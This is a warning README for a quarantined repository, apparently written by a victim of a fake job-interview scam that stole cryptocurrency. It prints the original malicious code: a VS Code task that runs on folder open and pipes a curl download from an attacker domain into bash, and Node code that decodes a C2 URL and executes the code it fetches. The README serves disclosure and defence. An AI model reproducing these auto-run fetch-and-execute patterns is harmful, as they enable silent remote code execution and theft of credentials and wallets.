# ⚠️ CRITICAL SECURITY WARNING ⚠️
# DO NOT CLONE OR RUN THIS REPOSITORY
# THIS IS MALWARE DISGUISED AS A TAKE-HOME ASSIGNMENT

---

## 🚨 IMMEDIATE DANGER - READ BEFORE PROCEEDING 🚨

**THIS REPOSITORY CONTAINS MALICIOUS CODE THAT WILL:**
- **STEAL YOUR CRYPTOCURRENCY** (MetaMask, other wallets)
- **EXECUTE ARBITRARY CODE** on your machine
- **COMPROMISE YOUR PRIVATE KEYS**
- **EXFILTRATE SENSITIVE DATA**

**DATE OF ATTACK:** January 16, 2026  
**ATTACK VECTOR:** Fake job interview / take-home assignment  
**VICTIMS:** Confirmed cryptocurrency theft

---

## What This Repository Actually Is

This is **NOT** a legitimate real estate platform or coding assignment. It is a **sophisticated malware delivery system** designed to steal cryptocurrency from developers during fake job interviews.

### Attack Method:

1. **Social Engineering**: Sent via recruiter/HR contact as a "take-home assignment"
2. **Delivery**: Shared via Google Drive link pointing to malicious Bitbucket repository
3. **Automatic Execution**: Malware runs immediately when folder is opened in VS Code
4. **Theft**: Steals MetaMask private keys and other cryptocurrency wallet data

---

## The Malicious Code

### 1. `.vscode/tasks.json` (Primary Attack)
**Executes automatically when you open this folder in VS Code**

```json
{
  "runOptions": {
    "runOn": "folderOpen"  // ← Runs WITHOUT user consent
  },
  "presentation": {
    "reveal": "never",      // ← Hides output from victim
    "echo": false           // ← Silent execution
  },
  "osx": {
    "command": "curl 'https://vscode-settings-config.vercel.app/settings/mac?flag=9' | bash"
  }
}
```

**What it does:**
- Downloads malicious script from attacker's server
- Executes with full system permissions
- Runs silently (no visible output)
- Installs keyloggers, modifies system files
- Intercepts browser/wallet data

### 2. `server/middlewares/validator/errorHandler.js` (Secondary Attack)
**Remote code execution when running `npm run dev`**

```javascript
// Line 29-38: Dynamic code execution
const handler = new (Function.constructor)('require', errCode);
handler(require);  // Executes ANY code from remote server

// Line 49-58: Fetches malicious code
const src = atob(process.env.RUNTIME_CONFIG_API_KEY); 
// Decodes to: https://y-lilac-sigma.vercel.app/api/ipcheck-encrypted/609
await axios.get(`${src}`);  // Downloads and executes
```

**What it does:**
- Connects to attacker's command & control server
- Downloads and executes arbitrary JavaScript
- Full Node.js access to your filesystem
- Can inject code into frontend to steal wallet data

---

## Malicious Infrastructure

### Attacker's Domains:
- `vscode-settings-config.vercel.app`
- `y-lilac-sigma.vercel.app`

### Original Source:
- **Bitbucket Repository**: (Original malicious repo - DO NOT CLONE)
- **GitHub User**: `codehome0301` <myselfmail0301@gmail.com>
- **Initial Commit**: October 27, 2025 at 14:45:10

### Distribution Method:
- Fake recruiters sending Google Drive links
- Links contain cloned/forked versions of this repo
- Presented as "Emrit" or other company take-home assignments

---

## Confirmed Damage

**Victim Report (January 23, 2026):**
- ✅ Repository cloned and opened in VS Code: Jan 16, 2026
- ✅ Malicious tasks.json executed automatically
- ✅ Development server started (secondary attack triggered)
- ✅ MetaMask wallet connected to application
- ✅ **CRYPTOCURRENCY STOLEN** - Confirmed total loss

**Timeline:**
- Jan 16, 13:18: Folder opened in VS Code
- Jan 16, 13:18: tasks.json auto-executes `curl | bash`
- Jan 16, ~13:20: Victim runs `npm install && npm run dev`
- Jan 16, ~13:25: errorTimeHandler() connects to C2 server
- Jan 16, ~13:30: Victim connects MetaMask wallet
- Jan 16-17: Private keys stolen and exfiltrated
- Jan 23: Victim discovers crypto theft

---

## How to Check If You're Affected

### If you opened this folder in VS Code:

1. **Immediately transfer all crypto** to NEW wallet with NEW seed phrase
2. **Change all passwords** (email, GitHub, cloud services, exchanges)
3. **Run malware scan**: Malwarebytes, ClamAV
4. **Check for persistence**:
   ```bash
   # macOS
   ls -la ~/Library/LaunchAgents/
   ls -la /Library/LaunchDaemons/
   crontab -l
   
   # Linux
   ls -la ~/.config/autostart/
   crontab -l
   systemctl list-unit-files --user
   
   # Windows
   Check Task Scheduler and Startup folder
   ```
5. **Review shell config**: Check `.bashrc`, `.zshrc` for injected code
6. **Monitor accounts**: Watch for unauthorized access/transactions

### If you ran `npm install` or `npm run dev`:

**You are CRITICALLY compromised.** Do all of the above PLUS:
- Consider full system reinstall
- Review all API keys in environment variables
- Check browser extensions for malicious additions
- Monitor bank/credit cards for fraud

---

## Prevention Tips

### 🛡️ How to Avoid This Scam:

1. **Verify the company** before doing any take-home assignment
   - Call the company directly (not the recruiter)
   - Verify recruiter on company website or LinkedIn
   - Google the recruiter's email address

2. **Inspect code before running**
   - Check `.vscode/tasks.json` for `runOn: folderOpen`
   - Review `package.json` scripts for suspicious commands
   - Search for `eval()`, `Function.constructor`, `child_process.exec()`
   - Look for `curl | bash` or similar patterns

3. **Use sandboxed environments**
   - Run untrusted code in Docker containers
   - Use virtual machines for take-home assignments
   - Never use your main development machine

4. **Check git history**
   ```bash
   git log --all --pretty=format:"%an <%ae> - %s"
   # Look for suspicious authors or commit messages
   ```

5. **Red flags in take-home assignments**:
   - Recruiter uses Gmail/personal email (not company domain)
   - Code shared via Google Drive instead of GitHub
   - Private/anonymous repositories
   - Pressure to complete quickly
   - Request to install specific VS Code extensions
   - `.vscode/` folder included in repository

---

## Legal Information

**This repository has been preserved for:**
- Cybersecurity research
- Public awareness
- Evidence collection
- Law enforcement investigation

**DO NOT:**
- Clone this repository
- Run any code from this repository
- Share this repository without warnings
- Use this code in any way

**Reported to:**
- FBI Internet Crime Complaint Center (IC3)
- Vercel (hosting provider)
- GitHub Security Team
- Bitbucket Security Team

---

## For Researchers

This repository is preserved in a **SAFE STATE**:
- ✅ Malicious `.vscode/tasks.json` disabled (renamed to `.disabled`)
- ✅ Forensic backup created (`.MALICIOUS_FORENSICS`)
- ✅ Malicious environment variables modified
- ✅ Comprehensive forensic report included

### Safe Files to Review:
- `SECURITY_BREACH_FORENSICS.md` - Complete forensic analysis
- `.vscode/tasks.json.MALICIOUS_FORENSICS` - Original malicious task
- `server/middlewares/validator/errorHandler.js` - Remote code execution
- `server/config/config.env.example` - Hidden C2 URLs

### DO NOT:
- Restore original tasks.json
- Run the development server
- Execute any npm scripts
- Access the attacker's domains

---

## Contact / Report Similar Scams

If you've encountered a similar scam:

**Report to:**
- **FBI IC3**: https://www.ic3.gov/
- **GitHub Security**: security@github.com
- **FTC**: https://reportfraud.ftc.gov/

**Contact Victim (for research):**
- GitHub: @XanDev3
- Email: xandev.eth@protonmail.com

---

## Attribution

**Victim/Researcher:** xander.nesta (XanDev3)  
**Attack Discovered:** January 23, 2026  
**Repository Secured:** January 23, 2026  
**Purpose:** Public awareness and prevention

---

# ⚠️ FINAL WARNING ⚠️

**IF YOU CLONED THIS REPOSITORY BEFORE JANUARY 23, 2026:**

**YOUR SYSTEM IS COMPROMISED. ACT IMMEDIATELY.**

1. Disconnect from internet
2. Transfer all cryptocurrency to new wallets
3. Change all passwords
4. Run full malware scan
5. Consider system reinstall

**DO NOT IGNORE THIS WARNING.**

The attackers specifically target developers with cryptocurrency.  
Multiple victims have lost significant amounts.  
This is an active, ongoing threat.

---

*Last Updated: January 23, 2026*  
*Repository Status: QUARANTINED - DO NOT RUN*
